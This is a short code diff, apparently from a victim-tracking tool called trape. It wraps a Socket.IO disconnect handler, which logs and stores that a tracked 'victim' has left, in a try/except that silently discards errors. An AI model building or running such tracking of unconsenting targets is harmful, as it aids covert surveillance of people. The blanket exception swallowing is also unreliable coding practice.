@@ -52,10 +52,13 @@ def send_room_message(message):
 
 @socketio.on("disconnect_request", namespace="/trape")
 def disconnect_request(d):
-    session['receive_count'] = session.get('receive_count', 0) + 1
-    emit('my_response', {'data': 'Disconnected!', 'count': session['receive_count']})
-    utils.Go(utils.Color['white'] + "[" + utils.Color['redBold'] + "-" + utils.Color['white'] + "]" + utils.Color['red'] + " " + "A victim has closed her connection with the following id:" + " " + utils.Color['green'] + d['vId'] + utils.Color['white'])
-    db.sentences_victim('disconnect_victim', d['vId'], 2)
+    try:
+        session['receive_count'] = session.get('receive_count', 0) + 1
+        emit('my_response', {'data': 'Disconnected!', 'count': session['receive_count']})
+        utils.Go(utils.Color['white'] + "[" + utils.Color['redBold'] + "-" + utils.Color['white'] + "]" + utils.Color['red'] + " " + "A victim has closed her connection with the following id:" + " " + utils.Color['green'] + d['vId'] + utils.Color['white'])
+        db.sentences_victim('disconnect_victim', d['vId'], 2)
+    except Exception as error:
+        pass
 
 @socketio.on_error("/trape")
 def error_handler(e):
